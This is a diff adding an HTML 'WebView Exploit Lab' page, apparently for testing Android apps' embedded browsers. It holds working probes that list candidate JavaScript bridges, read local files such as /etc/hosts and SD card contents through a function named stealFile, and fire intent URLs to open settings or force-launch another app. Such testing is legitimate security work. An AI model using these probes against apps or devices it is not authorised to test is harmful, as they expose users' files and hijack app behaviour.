@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Exploit Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
+        button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 100%; margin: 10px 0; cursor: pointer; }
+        .log { background: #000; padding: 10px; border: 1px dashed #555; height: 150px; overflow-y: scroll; font-size: 12px; color: #00ff00; }
+        h3 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+
+    <h3>1. Bridge & Object Discovery</h3>
+    <button onclick="findBridges()">Scan for Native Bridges</button>
+
+    <h3>2. File System Access (Sensitive Paths)</h3>
+    <button onclick="stealFile('/etc/hosts')">Read /etc/hosts</button>
+    <button onclick="stealFile('file:///sdcard/Download/test.txt')">Read SD Card File</button>
+
+    <h3>3. Intent & Settings Hijacking</h3>
+    <button onclick="triggerIntent('intent:#Intent;action=android.settings.SETTINGS;end')">Open Phone Settings</button>
+    <button onclick="triggerIntent('intent:#Intent;action=android.settings.WIFI_SETTINGS;end')">Open WiFi Settings</button>
+    <button onclick="triggerIntent('intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end')">Force Launch Instagram</button>
+
+    <h3>Logs:</h3>
+    <div id="log" class="log">Waiting for action...</div>
+
+    <script>
+        function log(msg) {
+            const l = document.getElementById('log');
+            l.innerHTML += "<br>> " + msg;
+            l.scrollTop = l.scrollHeight;
+        }
+
+        // 1. Bridges dhoondne ke liye
+        function findBridges() {
+            log("Scanning window objects...");
+            let found = [];
+            for (let i in window) {
+                try {
+                    if (window[i] !== null && typeof window[i] === 'object' && i !== 'window' && i !== 'document') {
+                        found.push(i);
+                    }
+                } catch(e) {}
+            }
+            log("Potential Bridges: " + found.join(", "));
+        }
+
+        // 2. File read karne ke liye (XHR exploit)
+        function stealFile(path) {
+            log("Attempting to read: " + path);
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if(xhr.responseText) {
+                        log("SUCCESS! Data: " + xhr.responseText.substring(0, 100) + "...");
+                        alert("Stolen Data: " + xhr.responseText);
+                    } else {
+                        log("FAILED: No access or file not found.");
+                    }
+                }
+            };
+            xhr.open("GET", path, true);
+            xhr.send();
+        }
+
+        // 3. Intent trigger karne ke liye
+        function triggerIntent(url) {
+            log("Triggering Intent: " + url);
+            window.location.href = url;
+        }
+    </script>
+
+</body>
+</html>
